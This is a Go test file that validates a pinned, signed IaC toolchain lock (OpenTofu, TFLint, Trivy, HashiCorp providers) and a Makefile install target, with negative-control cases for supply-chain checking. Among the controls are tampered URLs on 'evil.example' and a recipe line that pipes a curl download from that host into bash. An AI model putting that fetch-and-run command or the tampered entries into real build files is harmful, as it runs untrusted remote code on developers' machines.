package archtest

import (
	"bytes"
	"encoding/json"
	"maps"
	"net/url"
	"regexp"
	"slices"
	"strings"
	"testing"
	"time"
)

// ADR 0014 D15 (T6, T143), plan M3-T02: the lock of the IaC toolchain,
// checked here by its own reading, independent of validate.LoadToolchain.

const iacLockPath = "scripts/iac-tools.lock.json"

// hashicorpKey is the fingerprint of the key that signs the SHA256SUMS of
// the providers on releases.hashicorp.com (HashiCorp Security).
const hashicorpKey = "C874011F0AB405110D02105534365D9472D7468F"

// compromisedTrivy are the Trivy versions of advisory GHSA-69fq-xp46-6x23
// (March 2026 supply chain attack, risk R3 of plan M3).
var compromisedTrivy = []string{"0.69.4", "0.69.5", "0.69.6"}

var (
	lockSemverRe   = regexp.MustCompile(`^[0-9]+\.[0-9]+\.[0-9]+$`)
	lockDateRe     = regexp.MustCompile(`^[0-9]{4}-[0-9]{2}-[0-9]{2}$`)
	lockHexRe      = regexp.MustCompile(`^[0-9a-f]{64}$`)
	lockNameRe     = regexp.MustCompile(`^[a-z][a-z0-9-]{0,62}$`)
	lockKeyRe      = regexp.MustCompile(`^[0-9A-F]{40}$`)
	lockIdentityRe = regexp.MustCompile(`^https://github\.com/[a-z0-9-]+/[a-z0-9-]+/\.github/workflows/[a-z0-9-]+\.ya?ml@refs/(tags|heads)/v[0-9.]+$`)
	lockSourceRe   = regexp.MustCompile(`^registry\.opentofu\.org/hashicorp/([a-z0-9-]+)$`)
	lockPluginRe   = regexp.MustCompile(`^github\.com/terraform-linters/tflint-ruleset-[a-z0-9]+$`)
)

func keysOf(m map[string]any) []string { return slices.Sorted(maps.Keys(m)) }

// checkIaCLock applies D15 to the lock src, today being the date of the check.
func checkIaCLock(src []byte, today time.Time) []string {
	var problems problemList
	dec := json.NewDecoder(bytes.NewReader(src))
	dec.UseNumber()
	var lock map[string]any
	if err := dec.Decode(&lock); err != nil {
		problems.addf("%s: %v", iacLockPath, err)
		return problems
	}
	if dec.More() {
		problems.addf("%s: data after the lock object", iacLockPath)
	}
	if k := keysOf(lock); !slices.Equal(k, []string{"date", "hosts", "lock_version", "min_age_days", "platform", "providers", "tools"}) {
		problems.addf("lock keys %q, want exactly date hosts lock_version min_age_days platform providers tools", k)
		return problems
	}
	if lock["lock_version"] != json.Number("1") || lock["platform"] != "linux_amd64" {
		problems.addf("lock_version %v platform %v, want 1 and linux_amd64", lock["lock_version"], lock["platform"])
	}
	date, _ := lock["date"].(string)
	lockDay, err := time.Parse(time.DateOnly, date)
	if err != nil || lockDay.After(today) {
		problems.addf("lock date %q: want a past date YYYY-MM-DD", date)
	}
	ageNumber, _ := lock["min_age_days"].(json.Number)
	minAge, err := ageNumber.Int64()
	if err != nil || minAge < 14 {
		problems.addf("min_age_days %v, want at least 14", lock["min_age_days"])
	}
	hosts, _ := lock["hosts"].([]any)
	var hostList []string
	for _, h := range hosts {
		s, _ := h.(string)
		if s != "github.com" && s != "releases.hashicorp.com" {
			problems.addf("host %q outside the closed list github.com, releases.hashicorp.com", s)
		}
		hostList = append(hostList, s)
	}
	published := func(what string, v any) {
		s, _ := v.(string)
		d, err := time.Parse(time.DateOnly, s)
		if err != nil || !lockDateRe.MatchString(s) {
			problems.addf("%s: published %q is not a date", what, s)
			return
		}
		if d.After(lockDay.AddDate(0, 0, -int(minAge))) {
			problems.addf("%s: published %s, less than %d days before the lock date %s", what, s, minAge, date)
		}
	}
	httpsOn := func(what string, v any) string {
		s, _ := v.(string)
		u, err := url.Parse(s)
		if err != nil || u.Scheme != "https" || !slices.Contains(hostList, u.Host) || u.User != nil || u.RawQuery != "" || u.Fragment != "" {
			problems.addf("%s: url %q, want https on a listed host, no credentials, query or fragment", what, s)
			return ""
		}
		return u.Path
	}
	signature := func(what string, v any, wantKey string) {
		sig, _ := v.(map[string]any)
		if sig == nil || !slices.Equal(keysOf(sig), []string{"checked", "identity", "issuer", "key", "kind", "note"}) {
			problems.addf("%s: signature keys %q, want checked identity issuer key kind note", what, keysOf(sig))
			return
		}
		checked, _ := sig["checked"].(string)
		if !lockDateRe.MatchString(checked) {
			problems.addf("%s: signature checked %q is not a date", what, checked)
		}
		key, _ := sig["key"].(string)
		identity, _ := sig["identity"].(string)
		issuer, _ := sig["issuer"].(string)
		switch sig["kind"] {
		case "gpg":
			if !lockKeyRe.MatchString(key) || identity != "" || issuer != "" || (wantKey != "" && key != wantKey) {
				problems.addf("%s: gpg signature key %q, identity %q, issuer %q", what, key, identity, issuer)
			}
		case "cosign-keyless":
			if key != "" || !lockIdentityRe.MatchString(identity) || issuer != "https://token.actions.githubusercontent.com" || wantKey != "" {
				problems.addf("%s: cosign signature identity %q, issuer %q, key %q", what, identity, issuer, key)
			}
		default:
			problems.addf("%s: signature kind %v, want gpg or cosign-keyless", what, sig["kind"])
		}
	}

	tools, _ := lock["tools"].([]any)
	seen := map[string]bool{}
	for i, x := range tools {
		tl, _ := x.(map[string]any)
		name, _ := tl["name"].(string)
		what := "tool " + name
		if !lockNameRe.MatchString(name) || seen[name] {
			problems.addf("tools[%d]: name %q invalid or repeated", i, name)
		}
		seen[name] = true
		want := []string{"archive", "binary", "binary_sha256", "kind", "name", "published", "sha256", "signature", "url", "version"}
		if tl["kind"] == "tflint-plugin" {
			want = append(want, "plugin_source")
			slices.Sort(want)
			if s, _ := tl["plugin_source"].(string); !lockPluginRe.MatchString(s) || !strings.HasSuffix(s, "/"+name) {
				problems.addf("%s: plugin_source %q", what, s)
			}
		} else if tl["kind"] != "tool" {
			problems.addf("%s: kind %v, want tool or tflint-plugin", what, tl["kind"])
		}
		if k := keysOf(tl); !slices.Equal(k, want) {
			problems.addf("%s: keys %q, want %q", what, k, want)
			continue
		}
		version, _ := tl["version"].(string)
		if !lockSemverRe.MatchString(version) {
			problems.addf("%s: version %q is not exact", what, version)
		}
		if name == "trivy" && slices.Contains(compromisedTrivy, version) {
			problems.addf("%s: version %s is a compromised release (GHSA-69fq-xp46-6x23)", what, version)
		}
		if p := httpsOn(what, tl["url"]); p != "" && !strings.Contains(p, "/v"+version+"/") {
			problems.addf("%s: url path %q does not name v%s", what, p, version)
		}
		for _, h := range []string{"sha256", "binary_sha256"} {
			if s, _ := tl[h].(string); !lockHexRe.MatchString(s) {
				problems.addf("%s: %s %q is not a lowercase SHA-256", what, h, s)
			}
		}
		if a := tl["archive"]; a != "zip" && a != "tar.gz" {
			problems.addf("%s: archive %v", what, a)
		}
		if b, _ := tl["binary"].(string); !lockNameRe.MatchString(b) {
			problems.addf("%s: binary %q", what, b)
		}
		published(what, tl["published"])
		signature(what, tl["signature"], "")
	}
	for _, need := range []string{"tofu", "tflint", "tflint-ruleset-aws", "tflint-ruleset-azurerm", "trivy"} {
		if !seen[need] {
			problems.addf("tool %s missing from the lock", need)
		}
	}

	providers, _ := lock["providers"].([]any)
	seenP := map[string]bool{}
	for i, x := range providers {
		pv, _ := x.(map[string]any)
		source, _ := pv["source"].(string)
		what := "provider " + source
		m := lockSourceRe.FindStringSubmatch(source)
		if m == nil || seenP[source] {
			problems.addf("providers[%d]: source %q invalid or repeated", i, source)
			continue
		}
		seenP[source] = true
		if k := keysOf(pv); !slices.Equal(k, []string{"published", "sha256", "signature", "source", "url", "version"}) {
			problems.addf("%s: keys %q", what, k)
			continue
		}
		version, _ := pv["version"].(string)
		if !lockSemverRe.MatchString(version) {
			problems.addf("%s: version %q is not exact", what, version)
		}
		want := "https://releases.hashicorp.com/terraform-provider-" + m[1] + "/" + version + "/terraform-provider-" + m[1] + "_" + version + "_linux_amd64.zip"
		if pv["url"] != want {
			problems.addf("%s: url %v, want %s", what, pv["url"], want)
		}
		httpsOn(what, pv["url"])
		if s, _ := pv["sha256"].(string); !lockHexRe.MatchString(s) {
			problems.addf("%s: sha256 %q", what, s)
		}
		published(what, pv["published"])
		signature(what, pv["signature"], hashicorpKey)
	}
	for _, need := range []string{"aws", "azurerm", "helm"} {
		if !seenP["registry.opentofu.org/hashicorp/"+need] {
			problems.addf("provider hashicorp/%s missing from the lock", need)
		}
	}
	return problems
}

// validIaCLock is a synthetic lock in the closed form (negative controls).
const validIaCLock = `{
  "lock_version": 1, "date": "2026-11-26", "min_age_days": 14, "platform": "linux_amd64",
  "hosts": ["github.com", "releases.hashicorp.com"],
  "tools": [
    {"name": "tofu", "kind": "tool", "version": "1.13.2", "published": "2026-10-21",
     "url": "https://github.com/opentofu/opentofu/releases/download/v1.13.2/tofu_1.13.2_linux_amd64.zip",
     "sha256": "1111111111111111111111111111111111111111111111111111111111111111", "archive": "zip", "binary": "tofu",
     "binary_sha256": "2222222222222222222222222222222222222222222222222222222222222222",
     "signature": {"kind": "gpg", "key": "E3E6E43D84CB852EADB0051D0C0AF313E5FD9F80", "identity": "", "issuer": "", "checked": "2026-11-26", "note": ""}},
    {"name": "tflint", "kind": "tool", "version": "0.66.0", "published": "2026-11-08",
     "url": "https://github.com/terraform-linters/tflint/releases/download/v0.66.0/tflint_linux_amd64.zip",
     "sha256": "3333333333333333333333333333333333333333333333333333333333333333", "archive": "zip", "binary": "tflint",
     "binary_sha256": "4444444444444444444444444444444444444444444444444444444444444444",
     "signature": {"kind": "cosign-keyless", "key": "", "identity": "https://github.com/terraform-linters/tflint/.github/workflows/release.yml@refs/tags/v0.66.0", "issuer": "https://token.actions.githubusercontent.com", "checked": "2026-11-26", "note": ""}},
    {"name": "tflint-ruleset-aws", "kind": "tflint-plugin", "plugin_source": "github.com/terraform-linters/tflint-ruleset-aws", "version": "0.50.0", "published": "2026-10-23",
     "url": "https://github.com/terraform-linters/tflint-ruleset-aws/releases/download/v0.50.0/tflint-ruleset-aws_linux_amd64.zip",
     "sha256": "5555555555555555555555555555555555555555555555555555555555555555", "archive": "zip", "binary": "tflint-ruleset-aws",
     "binary_sha256": "6666666666666666666666666666666666666666666666666666666666666666",
     "signature": {"kind": "gpg", "key": "2DA7A4B11347B217385231D1131A2054C7B3FB65", "identity": "", "issuer": "", "checked": "2026-11-26", "note": ""}},
    {"name": "tflint-ruleset-azurerm", "kind": "tflint-plugin", "plugin_source": "github.com/terraform-linters/tflint-ruleset-azurerm", "version": "0.33.0", "published": "2026-10-25",
     "url": "https://github.com/terraform-linters/tflint-ruleset-azurerm/releases/download/v0.33.0/tflint-ruleset-azurerm_linux_amd64.zip",
     "sha256": "7777777777777777777777777777777777777777777777777777777777777777", "archive": "zip", "binary": "tflint-ruleset-azurerm",
     "binary_sha256": "8888888888888888888888888888888888888888888888888888888888888888",
     "signature": {"kind": "gpg", "key": "2DA7A4B11347B217385231D1131A2054C7B3FB65", "identity": "", "issuer": "", "checked": "2026-11-26", "note": ""}},
    {"name": "trivy", "kind": "tool", "version": "0.76.1", "published": "2026-10-21",
     "url": "https://github.com/aquasecurity/trivy/releases/download/v0.76.1/trivy_0.76.1_Linux-64bit.tar.gz",
     "sha256": "9999999999999999999999999999999999999999999999999999999999999999", "archive": "tar.gz", "binary": "trivy",
     "binary_sha256": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
     "signature": {"kind": "cosign-keyless", "key": "", "identity": "https://github.com/aquasecurity/trivy/.github/workflows/reusable-release.yaml@refs/tags/v0.76.1", "issuer": "https://token.actions.githubusercontent.com", "checked": "2026-11-26", "note": ""}}
  ],
  "providers": [
    {"source": "registry.opentofu.org/hashicorp/aws", "version": "6.72.0", "published": "2026-11-04",
     "url": "https://releases.hashicorp.com/terraform-provider-aws/6.72.0/terraform-provider-aws_6.72.0_linux_amd64.zip",
     "sha256": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
     "signature": {"kind": "gpg", "key": "C874011F0AB405110D02105534365D9472D7468F", "identity": "", "issuer": "", "checked": "2026-11-26", "note": ""}},
    {"source": "registry.opentofu.org/hashicorp/azurerm", "version": "5.13.0", "published": "2026-11-05",
     "url": "https://releases.hashicorp.com/terraform-provider-azurerm/5.13.0/terraform-provider-azurerm_5.13.0_linux_amd64.zip",
     "sha256": "cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc",
     "signature": {"kind": "gpg", "key": "C874011F0AB405110D02105534365D9472D7468F", "identity": "", "issuer": "", "checked": "2026-11-26", "note": ""}},
    {"source": "registry.opentofu.org/hashicorp/helm", "version": "3.3.0", "published": "2026-09-16",
     "url": "https://releases.hashicorp.com/terraform-provider-helm/3.3.0/terraform-provider-helm_3.3.0_linux_amd64.zip",
     "sha256": "dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd",
     "signature": {"kind": "gpg", "key": "C874011F0AB405110D02105534365D9472D7468F", "identity": "", "issuer": "", "checked": "2026-11-26", "note": ""}}
  ]
}
`

// TestIaCToolsLockPinned proves D15 (T6, T143) on scripts/iac-tools.lock.json,
// with negative controls on a synthetic lock.
func TestIaCToolsLockPinned(t *testing.T) {
	today := time.Date(2026, 11, 26, 0, 0, 0, 0, time.UTC)
	_, fsys := repoRoot(t)
	t.Run("repository", func(t *testing.T) {
		src, err := readRepoFile(fsys, iacLockPath, "M3-T02")
		if err != nil {
			t.Fatal(err)
		}
		reportProblems(t, checkIaCLock([]byte(src), time.Now().UTC()))
	})
	cases := []struct{ name, old, new, want string }{
		{"valid", "", "", ""},
		{"loose_version", `"version": "1.13.2"`, `"version": "1.13"`, "is not exact"},
		{"too_recent", `"published": "2026-11-08"`, `"published": "2026-11-20"`, "less than 14 days"},
		{"min_age_lowered", `"min_age_days": 14`, `"min_age_days": 3`, "want at least 14"},
		{"future_lock", `"date": "2026-11-26"`, `"date": "2027-01-01"`, "want a past date"},
		{"http_url", `https://github.com/opentofu`, `http://github.com/opentofu`, "want https on a listed host"},
		{"other_host", `https://github.com/aquasecurity/trivy/releases`, `https://evil.example/aquasecurity/trivy/releases`, "want https on a listed host"},
		{"host_added", `"hosts": ["github.com", "releases.hashicorp.com"]`, `"hosts": ["github.com", "releases.hashicorp.com", "evil.example"]`, "outside the closed list"},
		{"url_other_version", `download/v1.13.2/tofu_1.13.2`, `download/v1.13.1/tofu_1.13.2`, "does not name v1.13.2"},
		{"upper_hash", `"sha256": "9999999999999999999999999999999999999999999999999999999999999999"`, `"sha256": "999999999999999999999999999999999999999999999999999999999999999A"`, "not a lowercase SHA-256"},
		{"compromised_trivy", `"version": "0.76.1"`, `"version": "0.69.4"`, "compromised release"},
		{"no_signature", `"signature": {"kind": "gpg", "key": "E3E6E43D84CB852EADB0051D0C0AF313E5FD9F80", "identity": "", "issuer": "", "checked": "2026-11-26", "note": ""}},
    {"name": "tflint"`, `"signature": {}},
    {"name": "tflint"`, "signature keys"},
		{"cosign_other_issuer", `"issuer": "https://token.actions.githubusercontent.com", "checked": "2026-11-26", "note": ""}},
    {"name": "tflint-ruleset-aws"`, `"issuer": "https://accounts.google.com", "checked": "2026-11-26", "note": ""}},
    {"name": "tflint-ruleset-aws"`, "cosign signature identity"},
		{"provider_other_key", `"key": "C874011F0AB405110D02105534365D9472D7468F", "identity": "", "issuer": "", "checked": "2026-11-26", "note": ""}},
    {"source": "registry.opentofu.org/hashicorp/azurerm"`, `"key": "0000000000000000000000000000000000000000", "identity": "", "issuer": "", "checked": "2026-11-26", "note": ""}},
    {"source": "registry.opentofu.org/hashicorp/azurerm"`, "gpg signature key"},
		{"provider_mirror_url", `https://releases.hashicorp.com/terraform-provider-helm/3.3.0/terraform-provider-helm_3.3.0_linux_amd64.zip`, `https://releases.hashicorp.com/terraform-provider-helm/3.3.0/other.zip`, "want https://releases.hashicorp.com/terraform-provider-helm"},
		{"provider_other_namespace", `registry.opentofu.org/hashicorp/helm`, `registry.opentofu.org/evil/helm`, "source"},
		{"tool_missing", `{"name": "trivy", "kind": "tool"`, `{"name": "trivy-x", "kind": "tool"`, "tool trivy missing"},
		{"unknown_key", `"platform": "linux_amd64"`, `"platform": "linux_amd64", "mirror": "https://evil.example"`, "lock keys"},
		{"plugin_source_other", `"plugin_source": "github.com/terraform-linters/tflint-ruleset-aws"`, `"plugin_source": "github.com/evil/tflint-ruleset-aws"`, "plugin_source"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			src := validIaCLock
			if c.old != "" {
				src = mustReplace(t, src, c.old, c.new)
			}
			expectProblems(t, checkIaCLock([]byte(src), today), wants(c.want))
		})
	}
}

// TestMakefileIaCToolsTarget (M3-T02, R8): target iac-tools, declared .PHONY,
// installs then verifies the locked toolchain through scripts/iac-tools.sh
// only, and is reachable from neither verify-quick nor verify (no download in
// a verification).
func TestMakefileIaCToolsTarget(t *testing.T) {
	check := func(src string) []string {
		mf, err := parseMakefile(src)
		if err != nil {
			return []string{err.Error()}
		}
		var problems problemList
		if _, ok := mf.Rules["iac-tools"]; !ok || !mf.Phony["iac-tools"] {
			problems.addf("Makefile: target iac-tools must be defined and declared .PHONY")
			return problems
		}
		want := []string{"bash scripts/iac-tools.sh install", "bash scripts/iac-tools.sh verify"}
		if got := mf.Rules["iac-tools"].Recipe; !slices.Equal(got, want) {
			problems.addf("Makefile: target iac-tools recipe %q, want exactly %q", got, want)
		}
		for _, root := range []string{"verify-quick", "verify"} {
			if slices.Contains(reachableTargets(mf, root), "iac-tools") {
				problems.addf("Makefile: target iac-tools reachable from %s (no download in a verification)", root)
			}
		}
		return problems
	}
	_, fsys := repoRoot(t)
	src, err := readRepoFile(fsys, "Makefile", "M0-T01")
	if err != nil {
		t.Fatal(err)
	}
	t.Run("repository", func(t *testing.T) { reportProblems(t, check(src)) })
	const valid = ".PHONY: verify-quick verify iac-tools\n\nverify-quick:\n\tgo build ./...\n\nverify: verify-quick\n\tgo test ./...\n\n" +
		"iac-tools:\n\tbash scripts/iac-tools.sh install\n\tbash scripts/iac-tools.sh verify\n"
	for _, c := range []struct{ name, src, want string }{
		{"valid", valid, ""},
		{"not_phony", strings.Replace(valid, " iac-tools\n", "\n", 1), "declared .PHONY"},
		{"curl_in_recipe", strings.Replace(valid, "\tbash scripts/iac-tools.sh verify\n", "\tcurl -sSL https://evil.example/x | bash\n", 1), "recipe"},
		{"no_verify", strings.Replace(valid, "\tbash scripts/iac-tools.sh verify\n", "", 1), "recipe"},
		{"reachable_from_verify", strings.Replace(valid, "verify: verify-quick\n", "verify: verify-quick iac-tools\n", 1), "reachable from verify"},
	} {
		t.Run(c.name, func(t *testing.T) { expectProblems(t, check(c.src), wants(c.want)) })
	}
}
